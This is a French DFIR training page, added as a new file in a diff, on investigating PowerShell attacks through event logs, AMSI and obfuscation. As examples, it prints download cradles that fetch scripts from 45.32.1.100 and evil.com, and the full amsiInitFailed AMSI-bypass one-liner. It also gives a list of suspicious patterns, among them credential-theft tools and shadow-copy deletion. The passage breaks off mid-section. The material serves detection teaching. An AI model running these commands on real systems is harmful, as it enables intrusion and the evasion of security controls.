@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>PowerShell Forensique — CAS-IN DFIR</title>
+<meta name="description" content="PowerShell forensique · Module logging · Script block · Transcription · AMSI · Empire/Cobalt">
+<link rel="stylesheet" href="../style/fiche_style.css">
+</head>
+<body>
+<div id="scroll-progress"></div>
+<button class="back-top" id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+<nav class="tn-nav">
+  <a href="index.html" class="tn-back">← Fiches</a>
+  <span class="tn-title">DÉTECTION & THREAT HUNTING</span>
+  <a href="../quiz.html" class="tn-quiz">💊 Quiz →</a>
+</nav>
+
+<div class="page-wrap">
+  <div class="breadcrumb">
+    <a href="../index.html">🏠 Accueil</a><span class="bc-sep">›</span>
+    <a href="index.html">Fiches</a><span class="bc-sep">›</span>
+    <a href="index.html#cat-détection">Détection &amp; Threat Hunting</a><span class="bc-sep">›</span>
+    <span class="bc-current">PowerShell Forensique</span>
+    <span class="read-time-badge" style="margin-left:auto">⏱ ~12 min</span>
+  </div>
+
+  <div class="header" style="margin-top:1.25rem;padding-bottom:1.25rem;border-bottom:1px solid var(--border)">
+    <div><span style="font-size:2.2rem">🔵</span>
+    <span class="tag tag-gold" style="margin-left:.5rem">DFIR</span>
+    <span class="tag tag-cyan" style="margin-left:.3rem">PowerShell</span>
+    <span class="tag tag-blue" style="margin-left:.3rem">Windows</span>
+    <span class="tag tag-red" style="margin-left:.3rem">LOLBin</span></div>
+    <h1 style="font-family:var(--sans);font-size:2rem;font-weight:800;letter-spacing:-.5px;margin:.3rem 0 .15rem">PowerShell Forensique &amp; Détection</h1>
+    <div class="meta">EID 4104 ScriptBlock · EID 4103 Module · AMSI · Encoded commands · Downgrade v2 · MITRE T1059.001</div>
+  </div>
+
+  <div class="prereq-block" style="margin-top:1rem">
+    <div class="prereq-row"><span class="prereq-label">Prérequis :</span><a href="logs_windows.html" class="prereq-pill">📖 Logs Windows</a><a href="windows.html" class="prereq-pill">📖 Artefacts Windows</a><a href="active_directory.html" class="prereq-pill">📖 Active Directory</a></div>
+    <div class="prereq-row"><span class="prereq-label">Pratiquer :</span><a href="../tp.html?cat=ir" class="tp-pill">🧪 🚨 Incident Response</a><a href="../tp.html?cat=hunt" class="tp-pill">🧪 🔍 Threat Hunting</a></div>
+    <div class="prereq-row"><span class="prereq-label">Voir aussi :</span><a href="malware_forensique.html" class="related-pill">🔗 Malware Forensics</a><a href="siem_logs.html" class="related-pill">🔗 SIEM &amp; Logs</a><a href="anti_forensique.html" class="related-pill">🔗 Anti-Forensique</a></div>
+  </div>
+</div>
+
+<!-- TABS -->
+<div class="tabs" id="ps-tabs">
+  <button class="tab active" onclick="showTab('arch',this)">🏗 Architecture des logs</button>
+  <button class="tab" onclick="showTab('eids',this)">🎯 Event IDs critiques</button>
+  <button class="tab" onclick="showTab('amsi',this)">🛡 AMSI &amp; Bypass</button>
+  <button class="tab" onclick="showTab('obf',this)">🔣 Obfuscation</button>
+  <button class="tab" onclick="showTab('tools',this)">🔧 Détection &amp; Outils</button>
+</div>
+
+<!-- ══════════════════════════════════════════════
+     TAB 1 — ARCHITECTURE
+══════════════════════════════════════════════ -->
+<div class="tab-page active" id="tab-arch">
+
+<div class="concept-card">
+  <div class="concept-title">🔑 Pourquoi PowerShell est l'arme n°1 des attaquants modernes</div>
+  PowerShell est <strong>installé par défaut</strong> sur tout Windows depuis 7/2008 R2, signé par Microsoft, intégré aux EDR comme outil légitime, capable d'exécuter du code <strong>en mémoire sans toucher le disque</strong> (fileless), et pré-configuré pour télécharger et exécuter des charges réseau (<code>IEX</code>, <code>Net.WebClient</code>, <code>Invoke-WebRequest</code>). C'est l'archétype du <strong>Living-off-the-Land Binary (LOLBin)</strong>. Mappé sur <a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank">MITRE ATT&amp;CK T1059.001</a>, c'est l'une des techniques d'exécution les plus fréquentes (Empire, PowerSploit, Nishang, Invoke-Mimikatz, Cobalt Strike beacons).
+</div>
+
+<div class="sec-title">Architecture des canaux de logs PowerShell</div>
+<div class="sec-sub">Quatre niveaux de logging sur Windows — du plus pauvre au plus riche. Tous nécessitent une activation explicite (sauf EID 400/800).</div>
+
+<div class="arch-viz">
+  <div style="background:rgba(88,166,255,.04);border:2px solid rgba(88,166,255,.25);border-radius:12px;padding:1rem;margin-bottom:.5rem">
+    <div style="font-family:var(--mono);font-size:.6rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--blue);text-align:center;margin-bottom:.75rem;opacity:.8">⚡ Microsoft-Windows-PowerShell/Operational · Windows PowerShell.evtx</div>
+    <div style="display:flex!important;gap:.4rem;flex-wrap:wrap;justify-content:center;margin-bottom:.6rem">
+      <div style="flex:1;min-width:130px;padding:.65rem .6rem;border-radius:10px;border:1px solid rgba(106,128,168,.3);text-align:center;cursor:pointer;transition:transform .15s;user-select:none;background:rgba(106,128,168,.08);color:var(--muted)" onclick="showPSLog('engine')">
+        <span style="font-size:1.3rem;display:block;margin-bottom:.25rem">📋</span>
+        <div style="font-family:var(--sans);font-size:.72rem;font-weight:700;margin-bottom:.18rem">EID 400 / 403</div>
+        <div style="font-family:var(--mono);font-size:.57rem;opacity:.7;line-height:1.3">Engine start/stop<br>par défaut · pauvre</div>
+      </div>
+      <div style="flex:1;min-width:130px;padding:.65rem .6rem;border-radius:10px;border:1px solid rgba(240,192,64,.4);text-align:center;cursor:pointer;transition:transform .15s;user-select:none;background:rgba(240,192,64,.1);color:var(--gold)" onclick="showPSLog('module')">
+        <span style="font-size:1.3rem;display:block;margin-bottom:.25rem">📦</span>
+        <div style="font-family:var(--sans);font-size:.72rem;font-weight:700;margin-bottom:.18rem">EID 4103</div>
+        <div style="font-family:var(--mono);font-size:.57rem;opacity:.7;line-height:1.3">Module logging<br>verbeux · pipelines</div>
+      </div>
+      <div style="flex:2;min-width:130px;padding:.65rem .6rem;border-radius:10px;border:1px solid rgba(0,229,204,.45);text-align:center;cursor:pointer;transition:transform .15s;user-select:none;background:rgba(0,229,204,.12);color:var(--cyan)" id="ps-az-sb" onclick="showPSLog('sb')">
+        <span style="font-size:1.3rem;display:block;margin-bottom:.25rem">⭐</span>
+        <div style="font-family:var(--sans);font-size:.72rem;font-weight:700;margin-bottom:.18rem">EID 4104 — SCRIPT BLOCK</div>
+        <div style="font-family:var(--mono);font-size:.57rem;opacity:.7;line-height:1.3">code complet · de-obfusqué<br>artefact n°1 du DFIR PS</div>
+      </div>
+      <div style="flex:1;min-width:130px;padding:.65rem .6rem;border-radius:10px;border:1px solid rgba(188,140,255,.3);text-align:center;cursor:pointer;transition:transform .15s;user-select:none;background:rgba(188,140,255,.08);color:var(--purple)" onclick="showPSLog('trans')">
+        <span style="font-size:1.3rem;display:block;margin-bottom:.25rem">📜</span>
+        <div style="font-family:var(--sans);font-size:.72rem;font-weight:700;margin-bottom:.18rem">Transcription</div>
+        <div style="font-family:var(--mono);font-size:.57rem;opacity:.7;line-height:1.3">in + out + résultats<br>fichier .txt par session</div>
+      </div>
+    </div>
+    <div style="font-family:var(--mono);font-size:.62rem;color:var(--dim);text-align:center;line-height:1.5;margin-top:.5rem">
+      ⚠️ Par défaut <strong>seul EID 400/403/600 est actif</strong> — Module/ScriptBlock/Transcription sont à activer explicitement (GPO ou registre)<br>
+      Volume typique : EID 4104 ≈ raisonnable · EID 4103 ≈ verbeux (Invoke-Mimikatz seul génère 2 285 events 4103, ~7 Mo de logs · Mandiant)
+    </div>
+  </div>
+  <div id="ps-detail" style="margin-top:.5rem;padding:.85rem 1rem;background:rgba(13,17,23,.4);border:1px solid var(--border);border-radius:8px;font-size:.82rem;color:var(--muted);min-height:60px">
+    ℹ️ Sélectionnez un canal ci-dessus pour afficher ses détails forensiques.
+  </div>
+</div>
+
+<div class="sec-title" style="margin-top:1.5rem">Activation des logs PowerShell</div>
+
+<div class="memo-grid">
+  <div class="memo-card">
+    <div class="memo-card-title">🟢 GPO (production · domaine)</div>
+    <div style="font-family:var(--mono);font-size:.74rem;line-height:1.6;color:var(--text)">
+    Computer Configuration<br>
+    → Administrative Templates<br>
+    → Windows Components<br>
+    → Windows PowerShell<br>
+    &nbsp;&nbsp;<strong>✓ Turn on Module Logging</strong><br>
+    &nbsp;&nbsp;&nbsp;&nbsp;Modules: <code>*</code><br>
+    &nbsp;&nbsp;<strong>✓ Turn on PowerShell Script Block Logging</strong><br>
+    &nbsp;&nbsp;<strong>✓ Turn on PowerShell Transcription</strong><br>
+    &nbsp;&nbsp;&nbsp;&nbsp;Output: <code>\\fileserver\PSlogs$</code>
+    </div>
+  </div>
+  <div class="memo-card">
+    <div class="memo-card-title">🔧 Registre / PowerShell direct</div>
+    <div style="font-family:var(--mono);font-size:.7rem;line-height:1.55;color:var(--text)">
+    <span style="color:var(--cyan)"># ScriptBlock Logging</span><br>
+    $p = 'HKLM:\SOFTWARE\Policies\Microsoft\<br>
+    Windows\PowerShell\ScriptBlockLogging'<br>
+    New-Item $p -Force<br>
+    New-ItemProperty $p `<br>
+    &nbsp;&nbsp;-Name EnableScriptBlockLogging `<br>
+    &nbsp;&nbsp;-Value 1 -PropertyType DWord<br>
+    <br>
+    <span style="color:var(--cyan)"># Module Logging</span><br>
+    $p = '...PowerShell\ModuleLogging'<br>
+    -Name EnableModuleLogging -Value 1<br>
+    -Name '*' -PropertyType String
+    </div>
+  </div>
+</div>
+
+<div class="alert" style="margin:1rem 0">
+  ⚠️ <strong>Cache de session :</strong> les politiques de logging sont mises en cache au lancement de chaque runspace PowerShell. Une activation prend effet uniquement dans une <strong>nouvelle</strong> console — les sessions déjà ouvertes par un attaquant continuent à échapper au logging tant qu'elles vivent.
+</div>
+
+</div><!-- /tab-arch -->
+
+
+<!-- ══════════════════════════════════════════════
+     TAB 2 — EVENT IDs CRITIQUES
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-eids">
+
+<div class="concept-card">
+  <div class="concept-title">🎯 Les Event IDs PowerShell — par ordre d'utilité forensique</div>
+  En investigation, l'<strong>EID 4104</strong> est presque toujours la source primaire : il capture <strong>le texte complet du script block exécuté, de-obfusqué par le moteur PowerShell juste avant exécution</strong>. C'est la seule façon de voir le code que l'attaquant a réellement fait tourner — même si ce code n'a jamais touché le disque, même s'il a été reçu encodé en Base64, même s'il a été chiffré XOR.
+</div>
+
+<div class="sec-title">Tableau de référence</div>
+
+<table style="width:100%;border-collapse:collapse;border:1px solid var(--border);margin:1rem 0;font-size:.84rem">
+  <thead>
+  <tr style="background:rgba(106,128,168,.1)">
+    <th style="padding:.55rem;border:1px solid var(--border);text-align:left">EID</th>
+    <th style="padding:.55rem;border:1px solid var(--border);text-align:left">Nom · Canal</th>
+    <th style="padding:.55rem;border:1px solid var(--border);text-align:left">Activation</th>
+    <th style="padding:.55rem;border:1px solid var(--border);text-align:left">Valeur DFIR</th>
+  </tr>
+  </thead>
+  <tbody>
+  <tr style="background:rgba(0,229,204,.06)">
+    <td style="padding:.55rem;border:1px solid var(--border)"><strong style="color:var(--cyan)">4104</strong></td>
+    <td style="padding:.55rem;border:1px solid var(--border)"><strong>Script Block Logging</strong><br><code style="font-size:.7rem">…PowerShell/Operational</code></td>
+    <td style="padding:.55rem;border:1px solid var(--border)">GPO ou registre</td>
+    <td style="padding:.55rem;border:1px solid var(--border)">🔴 <strong>n°1</strong> — script entier de-obfusqué · scripts longs splittés sur plusieurs events (même <code>ScriptBlockId</code>) · <code>Level=Warning</code> = flag suspect par PS</td>
+  </tr>
+  <tr>
+    <td style="padding:.55rem;border:1px solid var(--border)"><strong style="color:var(--gold)">4103</strong></td>
+    <td style="padding:.55rem;border:1px solid var(--border)"><strong>Module Logging</strong><br><code style="font-size:.7rem">…PowerShell/Operational</code></td>
+    <td style="padding:.55rem;border:1px solid var(--border)">GPO ou registre + liste modules <code>*</code></td>
+    <td style="padding:.55rem;border:1px solid var(--border)">🟠 verbeux — détails pipelines, paramètres cmdlets, valeurs retour. Activer sur serveurs critiques uniquement (volume)</td>
+  </tr>
+  <tr>
+    <td style="padding:.55rem;border:1px solid var(--border)"><strong>400 / 403</strong></td>
+    <td style="padding:.55rem;border:1px solid var(--border)">Engine state start / stop<br><code style="font-size:.7rem">Windows PowerShell.evtx</code></td>
+    <td style="padding:.55rem;border:1px solid var(--border)"><strong>par défaut</strong></td>
+    <td style="padding:.55rem;border:1px solid var(--border)">🟡 indique <em>quand</em> une session PS a démarré · révèle l'usage de <strong>PowerShell v2</strong> (HostVersion=2.0) — signal fort de downgrade attack</td>
+  </tr>
+  <tr>
+    <td style="padding:.55rem;border:1px solid var(--border)"><strong>800</strong></td>
+    <td style="padding:.55rem;border:1px solid var(--border)">Pipeline execution<br><code style="font-size:.7rem">Windows PowerShell.evtx</code></td>
+    <td style="padding:.55rem;border:1px solid var(--border)">par défaut</td>
+    <td style="padding:.55rem;border:1px solid var(--border)">🟡 commandes du pipeline · moins riche que 4103/4104 mais disponible si rien d'autre</td>
+  </tr>
+  <tr>
+    <td style="padding:.55rem;border:1px solid var(--border)"><strong>4105 / 4106</strong></td>
+    <td style="padding:.55rem;border:1px solid var(--border)">Script block start/stop</td>
+    <td style="padding:.55rem;border:1px solid var(--border)">option dans GPO ScriptBlock</td>
+    <td style="padding:.55rem;border:1px solid var(--border)">⚠️ génère 96 458 events pour un seul Invoke-Mimikatz (Mandiant) · <strong>déconseillé</strong> sauf forensique ciblée</td>
+  </tr>
+  <tr>
+    <td style="padding:.55rem;border:1px solid var(--border)"><strong>1116 / 1117</strong></td>
+    <td style="padding:.55rem;border:1px solid var(--border)">AMSI detection<br><code style="font-size:.7rem">…Windows Defender/Operational</code></td>
+    <td style="padding:.55rem;border:1px solid var(--border)">par défaut (si Defender actif)</td>
+    <td style="padding:.55rem;border:1px solid var(--border)">🔴 Defender a flaggé une chaîne PowerShell suspecte via AMSI — corréler avec 4104 du même horodatage</td>
+  </tr>
+  </tbody>
+</table>
+
+<div class="sec-title" style="margin-top:1.5rem">Anatomie d'un event 4104</div>
+
+<div class="concept-card" style="background:rgba(13,17,23,.5)">
+<pre style="font-family:var(--mono);font-size:.74rem;line-height:1.6;color:var(--text);white-space:pre-wrap;margin:0">&lt;Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"&gt;
+  &lt;System&gt;
+    &lt;Provider Name="Microsoft-Windows-PowerShell"
+              Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /&gt;
+    &lt;EventID&gt;<strong style="color:var(--cyan)">4104</strong>&lt;/EventID&gt;
+    &lt;Level&gt;<strong style="color:var(--gold)">5</strong>&lt;/Level&gt;       <span style="color:var(--dim)"># 5=verbose · 3=warning (suspicious!) · 2=error</span>
+    &lt;TimeCreated SystemTime="2026-04-27T08:14:23.891Z" /&gt;
+    &lt;Channel&gt;Microsoft-Windows-PowerShell/Operational&lt;/Channel&gt;
+    &lt;Computer&gt;WS-FINANCE-04&lt;/Computer&gt;
+    &lt;Security UserID="<strong style="color:var(--purple)">S-1-5-21-…-1001</strong>" /&gt;   <span style="color:var(--dim"># SID exécutant</span>
+    &lt;Execution ProcessID="<strong>4328</strong>" ThreadID="4600" /&gt;
+  &lt;/System&gt;
+  &lt;EventData&gt;
+    &lt;Data Name="MessageNumber"&gt;1&lt;/Data&gt;
+    &lt;Data Name="MessageTotal"&gt;1&lt;/Data&gt;        <span style="color:var(--dim)"># &gt;1 = script splitté</span>
+    &lt;Data Name="<strong style="color:var(--cyan)">ScriptBlockText</strong>"&gt;
+      IEX (New-Object Net.WebClient).DownloadString(
+        'http://45.32.1.100/stage2.ps1')
+    &lt;/Data&gt;
+    &lt;Data Name="<strong>ScriptBlockId</strong>"&gt;808e4d85-977e-4418-9218-59dd2aa1b0ef&lt;/Data&gt;
+    &lt;Data Name="Path"&gt;&lt;/Data&gt;                <span style="color:var(--dim)"># vide = exécution interactive ou via -Command</span>
+  &lt;/EventData&gt;
+&lt;/Event&gt;</pre>
+</div>
+
+<div class="memo-grid" style="margin-top:1rem">
+  <div class="memo-card">
+    <div class="memo-card-title">🔍 Champs forensiques clés</div>
+    <ul style="margin:.4rem 0 0 1.2rem;font-size:.82rem;line-height:1.55">
+      <li><code>ScriptBlockText</code> — code <strong>de-obfusqué</strong> tel qu'exécuté</li>
+      <li><code>ScriptBlockId</code> — identifiant unique pour réassembler les scripts longs (un ScriptBlockText par event, plusieurs events partagent le même Id)</li>
+      <li><code>UserID</code> (SID) — corréler avec <strong>EID 4624</strong> du Security log</li>
+      <li><code>ProcessID</code> — corréler avec <strong>EID 4688</strong> + <strong>Sysmon EID 1</strong> pour la lignée de processus</li>
+      <li><code>Path</code> — chemin du .ps1 si exécuté depuis fichier ; vide si <code>-Command</code> ou interactif</li>
+    </ul>
+  </div>
+  <div class="memo-card">
+    <div class="memo-card-title">🚨 Patterns suspects à alerter</div>
+    <ul style="margin:.4rem 0 0 1.2rem;font-size:.82rem;line-height:1.55;font-family:var(--mono);font-size:.74rem">
+      <li><code>IEX</code> · <code>Invoke-Expression</code></li>
+      <li><code>Net.WebClient</code> · <code>DownloadString</code> · <code>DownloadFile</code></li>
+      <li><code>-Enc</code> · <code>-EncodedCommand</code> · <code>-e </code></li>
+      <li><code>-nop</code> + <code>-w hidden</code> + <code>-ep bypass</code></li>
+      <li><code>FromBase64String</code> · <code>System.Convert</code></li>
+      <li><code>Invoke-Mimikatz</code> · <code>Invoke-DCSync</code></li>
+      <li><code>[Reflection.Assembly]::Load</code></li>
+      <li><code>amsiInitFailed</code> · <code>AmsiUtils</code></li>
+      <li><code>vssadmin delete shadows</code> via PS</li>
+    </ul>
+  </div>
+</div>
+
+</div><!-- /tab-eids -->
+
+
+<!-- ══════════════════════════════════════════════
+     TAB 3 — AMSI & BYPASS
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-amsi">
+
+<div class="concept-card">
+  <div class="concept-title">🛡 AMSI — Antimalware Scan Interface (Windows 10+)</div>
+  <strong>AMSI</strong> est l'interface introduite avec Windows 10 (2015) qui permet à n'importe quelle application — PowerShell, JScript, VBScript, Office VBA, .NET — de soumettre du contenu à <strong>Microsoft Defender (ou tout AV compatible)</strong> avant exécution. Pour PowerShell, AMSI scanne <em>chaque script block au moment où il est compilé</em>, après dé-obfuscation. C'est le mécanisme qui permet à Defender de détecter Mimikatz/Empire/Cobalt Strike même quand ils sont exécutés en mémoire après plusieurs couches d'encodage.
+</div>
+
+<div class="sec-title">Flux AMSI dans PowerShell</div>
+
+<div class="arch-viz">
+  <div style="background:rgba(13,17,23,.4);border:1px solid var(--border);border-radius:12px;padding:1rem">
+    <div style="display:flex;flex-direction:column;gap:.5rem;font-family:var(--mono);font-size:.78rem">
+      <div style="padding:.6rem .85rem;background:rgba(106,128,168,.1);border-left:3px solid var(--muted);border-radius:0 6px 6px 0">
+        <strong>1.</strong> Code PowerShell entrant (<code>-Command</code>, fichier <code>.ps1</code>, <code>IEX</code>, pipeline distant, etc.)
+      </div>
+      <div style="text-align:center;color:var(--dim)">↓</div>
+      <div style="padding:.6rem .85rem;background:rgba(240,192,64,.08);border-left:3px solid var(--gold);border-radius:0 6px 6px 0">
+        <strong>2.</strong> PowerShell <strong>de-obfusque</strong> le script block (Base64, XOR, ROT13, compression…)
+      </div>
+      <div style="text-align:center;color:var(--dim)">↓</div>
+      <div style="padding:.6rem .85rem;background:rgba(0,229,204,.08);border-left:3px solid var(--cyan);border-radius:0 6px 6px 0">
+        <strong>3.</strong> <code>System.Management.Automation.AmsiUtils</code> appelle <code>AmsiScanBuffer()</code> avec le code clair
+      </div>
+      <div style="text-align:center;color:var(--dim)">↓</div>
+      <div style="padding:.6rem .85rem;background:rgba(255,64,96,.08);border-left:3px solid var(--red);border-radius:0 6px 6px 0">
+        <strong>4a.</strong> ❌ Defender flag → script <strong>bloqué</strong> + EID 1116/1117 dans Defender/Operational + EID 4104 niveau Warning
+      </div>
+      <div style="padding:.6rem .85rem;background:rgba(48,232,138,.08);border-left:3px solid var(--green);border-radius:0 6px 6px 0">
+        <strong>4b.</strong> ✅ Pas de flag → script exécuté + EID 4104 niveau 5 (Verbose)
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="sec-title" style="margin-top:1.5rem">Techniques de bypass AMSI (à connaître pour la détection)</div>
+
+<div class="alert alert-red" style="margin:1rem 0">
+  ⚠️ <strong>Important :</strong> ces techniques sont documentées publiquement et utilisées par les attaquants depuis 2016. La connaissance de <strong>leurs traces forensiques</strong> est ce qui compte pour le DFIR — pas leur reproduction.
+</div>
+
+<div class="memo-grid">
+  <div class="memo-card" style="border-color:rgba(255,64,96,.3)">
+    <div class="memo-card-title" style="color:var(--red)">① Patch <code>amsiInitFailed</code> (le plus connu)</div>
+    <div style="font-family:var(--mono);font-size:.7rem;color:var(--text);background:rgba(13,17,23,.5);padding:.5rem;border-radius:4px;margin-top:.4rem;line-height:1.5;overflow-x:auto">
+[Ref].Assembly.GetType('System.Management.<br>
+Automation.AmsiUtils').GetField('amsiInit<br>
+Failed','NonPublic,Static').SetValue($null,$true)
+    </div>
+    <div style="font-size:.78rem;margin-top:.4rem">
+      <strong>Trace :</strong> EID 4104 contenant <code>amsiInitFailed</code> ou <code>AmsiUtils</code> — chaîne directement signaturée par Defender depuis 2018, donc bloquée par AMSI elle-même → souvent obfusquée.
+    </div>
+  </div>
+  <div class="memo-card" style="border-color:rgba(240,192,64,.3)">
+    <div class="memo-card-title" style="color:var(--gold)">② Patch mémoire d'<code>AmsiScanBuffer</code></div>
+    <div style="font-size:.78rem;margin-top:.4rem;line-height:1.5">
+      Réécrit la première instruction d'<code>amsi.dll!AmsiScanBuffer</code> en mémoire (<code>VirtualProtect</code> + écriture <code>xor eax,eax; ret</code>) pour qu'elle retourne « clean » à chaque appel.
+    </div>
+    <div style="font-size:.78rem;margin-top:.4rem">
+      <strong>Trace :</strong> appel inhabituel à <code>VirtualProtect</code> sur <code>amsi.dll</code> visible en RAM (Volatility <code>malfind</code>) ou via Sysmon EID 7 (image load) + EID 10 (process access).
+    </div>
+  </div>
+  <div class="memo-card" style="border-color:rgba(188,140,255,.3)">
+    <div class="memo-card-title" style="color:var(--purple)">③ Downgrade vers PowerShell v2</div>
+    <div style="font-family:var(--mono);font-size:.7rem;color:var(--text);background:rgba(13,17,23,.5);padding:.5rem;border-radius:4px;margin-top:.4rem">
+powershell.exe -Version 2 -Command ...
+    </div>
+    <div style="font-size:.78rem;margin-top:.4rem;line-height:1.5">
+      PowerShell 2.0 <strong>n'a ni AMSI ni ScriptBlock Logging</strong>. Si la fonctionnalité .NET 3.5 est installée, l'attaquant peut forcer cette version.
+    </div>
+    <div style="font-size:.78rem;margin-top:.4rem">
+      <strong>Trace :</strong> EID 400 avec <code>HostVersion=2.0</code> · EID 4688 avec <code>-Version 2</code> en ligne de commande · ⚠️ <strong>désactiver PS v2</strong> est la meilleure mitigation : <code>Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root</code>
+    </div>
+  </div>
+  <div class="memo-card" style="border-color:rgba(0,229,204,.3)">
+    <div class="memo-card-title" style="color:var(--cyan)">④ Hook ETW (couper les logs à la source)</div>
+    <div style="font-size:.78rem;margin-top:.4rem;line-height:1.5">
+      Patch de <code>EtwEventWrite</code> pour empêcher PowerShell d'émettre les events 4103/4104 vers ETW → aucun log généré.
+    </div>
+    <div style="font-size:.78rem;margin-top:.4rem">
+      <strong>Trace :</strong> <em>silence anormal</em> — pas d'EID 4104 alors que <code>powershell.exe</code> a tourné selon Sysmon EID 1. Détection par <strong>corrélation</strong>, pas par signature.
+    </div>
+  </div>
+</div>
+
+</div><!-- /tab-amsi -->
+
+
+<!-- ══════════════════════════════════════════════
+     TAB 4 — OBFUSCATION
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-obf">
+
+<div class="concept-card">
+  <div class="concept-title">🔣 Encoded Commands &amp; Obfuscation</div>
+  PowerShell accepte un argument <code>-EncodedCommand</code> (alias <code>-Enc</code>, <code>-e</code>) qui prend une chaîne <strong>Base64 d'une chaîne UTF-16 LE</strong> à exécuter. C'est un canal légitime de transmission de scripts (caractères spéciaux sur la ligne de commande), mais c'est aussi <strong>la technique d'obfuscation la plus utilisée par les attaquants</strong> car elle masque le code dans EID 4688 (process creation) et la ligne de commande.
+</div>
+
+<div class="sec-title">Décodage manuel d'un payload encodé</div>
+
+<div class="concept-card" style="background:rgba(13,17,23,.5)">
+<div style="font-family:var(--mono);font-size:.78rem;line-height:1.6;color:var(--text)">
+<span style="color:var(--gold)"># Ce qu'on voit dans EID 4688 / Sysmon EID 1 :</span><br>
+powershell.exe -nop -w hidden -ep bypass <strong style="color:var(--cyan)">-Enc</strong> SQBFAFgAIAAoAE4AZQB3<br>
+&nbsp;&nbsp;&nbsp;&nbsp;-QBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQA<br>
+&nbsp;&nbsp;&nbsp;&nbsp;bwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAHYA<br>
+&nbsp;&nbsp;&nbsp;&nbsp;aQBsAC4AYwBvAG0ALwBwAC4AcABzADEAJwApAA==<br>
+<br>
+<span style="color:var(--gold)"># Décoder en PowerShell ou Python :</span><br>
+<span style="color:var(--cyan)">[System.Text.Encoding]::Unicode.GetString(<br>
+&nbsp;&nbsp;[System.Convert]::FromBase64String($enc))</span><br>
+<br>
+<span style="color:var(--gold"># Python alternative (CLI / cross-platform) :</span><br>
+$ echo "SQBFAFgA..." | base64 -d | iconv -f UTF-16LE -t UTF-8<br>
+<br>
+<span style="color:var(--gold)"># → résultat :</span><br>
+<strong style="color:var(--green)">IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')</strong>
+</div>
+</div>
+
+<div class="alert" style="margin:1rem 0;background:rgba(0,229,204,.06);border-color:rgba(0,229,204,.4)">
+  💡 <strong>Bonne nouvelle :</strong> dans <strong>EID 4104</strong>, ce payload apparaîtra <strong>déjà décodé</strong> sous forme de <code>ScriptBlockText</code> en clair, parce que ScriptBlock Logging capture le code <em>après</em> de-obfuscation par le moteur PS. C'est pourquoi 4104 est l'artefact n°1 : pas besoin de décoder soi-même.
+</div>
+
+<div class="sec-title" style="margin-top:1.5rem">Couches d'obfuscation courantes</div>
+
+<table style="width:100%;border-collapse:collapse;border:1px solid var(--border);margin:1rem 0;font-size:.82rem">
+  <thead>
+  <tr style="background:rgba(106,128,168,.1)">
+    <th style="padding:.5rem;border:1px solid var(--border);text-align:left">Technique</th>
+    <th style="padding:.5rem;border:1px solid var(--border);text-align:left">Exemple</th>
+    <th style="padding:.5rem;border:1px solid var(--border);text-align:left">Visible dans 4104 ?</th>
+  </tr>
+  </thead>
+  <tbody>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>Base64</strong></td>
+    <td style="padding:.5rem;border:1px solid var(--border);font-family:var(--mono);font-size:.74rem"><code>-EncodedCommand SQBFAFg…</code></td>
+    <td style="padding:.5rem;border:1px solid var(--border)">✅ décodé</td>
+  </tr>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>String concat</strong></td>
+    <td style="padding:.5rem;border:1px solid var(--border);font-family:var(--mono);font-size:.74rem"><code>"I"+"E"+"X"</code> · <code>('In'+'voke-Mim'+'ikatz')</code></td>
+    <td style="padding:.5rem;border:1px solid var(--border)">⚠️ partiellement (texte concaténé visible)</td>
+  </tr>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>Char codes</strong></td>
+    <td style="padding:.5rem;border:1px solid var(--border);font-family:var(--mono);font-size:.74rem"><code>[char]73 + [char]69 + [char]88</code></td>
+    <td style="padding:.5rem;border:1px solid var(--border)">⚠️ partiellement</td>
+  </tr>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>Reverse string</strong></td>
+    <td style="padding:.5rem;border:1px solid var(--border);font-family:var(--mono);font-size:.74rem"><code>"XEI"[-1..-3] -join ''</code></td>
+    <td style="padding:.5rem;border:1px solid var(--border)">⚠️ partiellement</td>
+  </tr>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>XOR / compression</strong></td>
+    <td style="padding:.5rem;border:1px solid var(--border);font-family:var(--mono);font-size:.74rem">XOR avec clé statique + Base64</td>
+    <td style="padding:.5rem;border:1px solid var(--border)">✅ décodé (PS de-obfusque avant exec)</td>
+  </tr>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>Invoke-Obfuscation (Bohannon)</strong></td>
+    <td style="padding:.5rem;border:1px solid var(--border);font-family:var(--mono);font-size:.74rem">framework de génération auto · 30+ tokens</td>
+    <td style="padding:.5rem;border:1px solid var(--border)">⚠️ EID 4104 contient l'IL final mais souvent illisible</td>
+  </tr>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>Reflective .NET load</strong></td>
+    <td style="padding:.5rem;border:1px solid var(--border);font-family:var(--mono);font-size:.74rem"><code>[Reflection.Assembly]::Load($bytes)</code></td>
+    <td style="padding:.5rem;border:1px solid var(--border)">🔴 binaire chargé sans fichier · seul le wrapper PS est loggé</td>
+  </tr>
+  </tbody>
+</table>
+
+<div class="exam-tip">
+  <div class="exam-tip-title">🎓 Le « download cradle » classique</div>
+  Le pattern le plus fréquent en 2024-2026 reste le <strong>download cradle</strong> :
